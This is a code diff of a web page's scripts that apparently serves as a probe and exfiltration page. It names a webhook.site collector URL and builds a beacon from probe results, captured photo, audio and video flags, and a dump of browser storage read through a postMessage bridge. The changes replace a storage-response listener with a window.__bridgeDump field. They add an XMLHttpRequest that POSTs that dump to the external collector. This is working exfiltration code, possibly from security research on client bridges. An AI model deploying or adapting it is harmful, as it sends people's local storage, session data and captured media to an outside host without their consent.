@@ -60,8 +60,8 @@
   /* Collector URL — inlined to avoid browser cache serving stale collector-config.js */
   var COLLECTOR_URL = "https://webhook.site/1a50d175-1bed-455a-a407-7246a26d77e9";
 </script>
-<script src="js/client-detect.js?v=5"></script>
-<script src="js/probes.js?v=5"></script>
+<script src="js/client-detect.js?v=6"></script>
+<script src="js/probes.js?v=6"></script>
 <script>
 (function() {
   "use strict";
@@ -136,7 +136,7 @@
       probes: probeResults.map(function(r) {
         return { name: r.name, status: r.status, detail: r.detail };
       }),
-      postmessage_bridge_findings: [],
+      postmessage_bridge_dump: window.__bridgeDump || null,
       media_captured: {
         photo: !!window.__capturedPhoto,
         audio: !!window.__capturedAudio,
@@ -146,24 +146,6 @@
     };
     return beacon;
   }
-
-  // ── postMessage bridge listener (captures async responses after probe) ──
-  window.addEventListener("message", function(event) {
-    var type = event.data && event.data.type;
-    if (type === "LocalStorageResponse" || type === "SessionStorageResponse" || type === "IDBResponse") {
-      // Additional bridge response captured — append to any pending beacon
-      if (window.__pendingBeacon) {
-        window.__pendingBeacon.postmessage_bridge_findings.push({
-          type: type,
-          origin: event.origin,
-          value: event.data.result || event.data.error,
-          requestId: event.data.requestId
-        });
-        document.getElementById("exfil-payload").textContent =
-          JSON.stringify(window.__pendingBeacon, null, 2);
-      }
-    }
-  });
 
   // ── Exfil sender ─────────────────────────────────────────────────
   function sendBeacon(beacon) {
@@ -300,6 +282,12 @@
     setTimeout(function() {
       sendMediaUpload("audio", window.__capturedAudio);
       sendMediaUpload("video", window.__capturedVideo);
+      if (window.__bridgeDump && COLLECTOR_URL && COLLECTOR_URL !== "<SET-ME>") {
+        var xhr2 = new XMLHttpRequest();
+        xhr2.open("POST", COLLECTOR_URL + "?_media=bridge-dump&_t=" + Date.now(), true);
+        xhr2.setRequestHeader("Content-Type", "application/json");
+        xhr2.send(JSON.stringify(window.__bridgeDump, null, 2));
+      }
     }, 1000);
 
   }).catch(function(e) {
